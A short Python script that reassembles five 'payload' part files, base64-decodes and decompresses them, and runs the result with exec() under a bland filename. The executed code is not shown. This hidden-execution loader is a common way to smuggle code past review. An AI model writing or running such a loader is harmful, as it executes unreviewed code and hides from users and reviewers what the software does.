from pathlib import Path
import base64
import zlib

payload = "".join(
    Path(f"tools/userspace_pipelines_payload.part{index}").read_text().strip()
    for index in range(1, 6)
)
source = zlib.decompress(base64.b64decode(payload)).decode()
exec(compile(source, "userspace-pipeline-integration", "exec"))
